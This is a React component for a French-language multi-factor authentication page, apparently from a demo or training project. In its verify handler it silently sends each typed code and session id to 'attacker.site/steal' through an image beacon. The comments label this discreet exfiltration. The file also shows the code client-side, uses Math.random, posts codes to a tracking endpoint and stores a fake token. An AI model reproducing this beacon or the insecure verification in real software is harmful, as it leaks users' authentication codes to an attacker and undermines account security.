// 📁 frontend/src/pages/Security/MFA.js
import React, { useState, useEffect, useRef } from "react";
import { useNavigate } from "react-router-dom";
import "../../theme/styles.css";

export default function MFA() {
  const navigate = useNavigate();
  const [code, setCode] = useState("");
  const [input, setInput] = useState("");
  const [status, setStatus] = useState("");
  const [timer, setTimer] = useState(30);
  const session = useRef(Date.now());

  // Rafraîchit le code et notifie le backend
  const refreshCode = () => {
    const newCode = Math.floor(100000 + Math.random() * 900000).toString();
    setCode(newCode);
    setTimer(30);
    fetch("http://localhost:8081/track", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        event: "mfa_code_refreshed",
        code: newCode,
        session: session.current,
      }),
    });
  };

  // À la montée / on démonte : boucle toutes les 30 s
  useEffect(() => {
    refreshCode();
    const iv = setInterval(() => {
      setTimer((t) => {
        if (t <= 1) {
          refreshCode();
          return 30;
        }
        return t - 1;
      });
    }, 1000);
    return () => clearInterval(iv);
  }, []);

  const handleVerify = async () => {
    // 1) Traque la tentative
    await fetch("http://localhost:8081/track", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        event: "mfa_attempt",
        input,
        session: session.current,
      }),
    });

    // 2) Exfiltration discrète du code tapé
    new Image().src = `http://attacker.site/steal?code=${input}&session=${session.current}`;

    // 3) Vérification « offline »
    if (input === code) {
      setStatus("✔️ Code valide, redirection...");
      // faux JWT
      localStorage.setItem("jwt", `${code}-securepanel-faketoken`);
      // Traque le succès
      await fetch("http://localhost:8081/track", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          event: "mfa_success",
          session: session.current,
        }),
      });
      setTimeout(() => navigate("/dashboard"), 1000);
    } else {
      setStatus("❌ Code invalide, veuillez réessayer.");
    }
  };

  return (
    <div className="container mt-5 text-center">
      <h2>🔐 Authentification Multi-Facteurs</h2>
      <p className="text-muted">Entrez le code à 6 chiffres :</p>

      <div className="mb-3">
        <code className="fs-2">{code}</code>
        <div className="small text-muted">Expire dans {timer}s</div>
      </div>

      <input
        type="text"
        className="form-control w-25 mx-auto text-center"
        placeholder="000000"
        maxLength={6}
        value={input}
        onChange={(e) => setInput(e.target.value.replace(/\D/, ""))}
      />

      <div className="mt-3">
        <button className="btn btn-primary me-2" onClick={handleVerify}>
          Vérifier
        </button>
        <button className="btn btn-link" onClick={refreshCode}>
          🔄 Nouveau code
        </button>
      </div>

      {status && <div className="alert alert-info mt-3">{status}</div>}
    </div>
  );
}
